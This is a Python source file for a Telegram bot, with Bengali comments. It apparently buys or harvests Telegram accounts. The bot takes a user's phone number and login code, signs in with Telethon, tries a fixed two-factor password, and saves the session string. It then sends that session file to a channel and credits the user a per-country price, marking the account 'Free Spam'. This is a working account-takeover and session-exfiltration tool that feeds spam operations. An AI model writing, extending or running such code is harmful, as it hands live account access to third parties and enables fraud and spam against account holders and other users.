
from pyrogram import filters
from pyrogram.types import Message
from bot.utils import storage
from config import SESSION_2FA_PASSWORD, CHANNEL_ID, API_ID, API_HASH
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
import asyncio
import os

# /start কমান্ড হ্যান্ডলার
async def start_handler(client, message: Message):
    await message.reply_text(
        "🎉 Welcome to Robot!\n"
        "Enter your phone number with the country code.\n"
        "Example: +62xxxxxxxxxxx\n\n"
        "Type /cap to see available countries."
    )
    storage.save_temp(message.from_user.id, "awaiting_phone")

# ফোন নম্বর ও কোড প্রসেসিং হ্যান্ডলার
async def phone_handler(client, message: Message):
    uid = message.from_user.id
    state = storage.get_temp(uid)

    if state == "awaiting_phone":
        phone = message.text.strip()
        storage.save_temp(uid, "awaiting_code")
        storage.save_temp(uid, phone)  # save phone separately

        try:
            tele_client = TelegramClient(StringSession(), API_ID, API_HASH)
            await tele_client.connect()
            await tele_client.send_code_request(phone)
            await message.reply("✅ Code sent. Enter the code:")
            await tele_client.disconnect()
        except Exception as e:
            await message.reply(f"❌ Failed to send code: {e}")
            storage.clear_temp(uid)

    elif state == "awaiting_code":
        code = message.text.strip()
        phone = storage.get_temp(uid, phone=True)

        try:
            tele_client = TelegramClient(StringSession(), API_ID, API_HASH)
            await tele_client.connect()
            await tele_client.sign_in(phone=phone, code=code)

            try:
                await tele_client.sign_in(password=SESSION_2FA_PASSWORD)
            except SessionPasswordNeededError:
                pass

            string_session = tele_client.session.save()
            file_path = f"sessions/{uid}.session"
            os.makedirs("sessions", exist_ok=True)
            with open(file_path, "w") as f:
                f.write(string_session)

            await client.send_document(CHANNEL_ID, file_path)

            country = storage.get_country_from_phone(phone)
            rate = storage.get_rate(country)
            storage.add_balance(uid, rate)
            storage.increment_success(uid)

            await message.reply(
                f"🎉 We have successfully processed your account\n"
                f"Number: {phone}\n"
                f"Price: {rate} USD\n"
                "Status: Free Spam\n"
                "Congratulations, has been added to your balance."
            )

        except PhoneCodeInvalidError:
            await message.reply("❌ Invalid code. Please restart with /start.")
        except Exception as e:
            await message.reply(f"❌ Error: {e}")
        finally:
            storage.clear_temp(uid)
            await tele_client.disconnect()
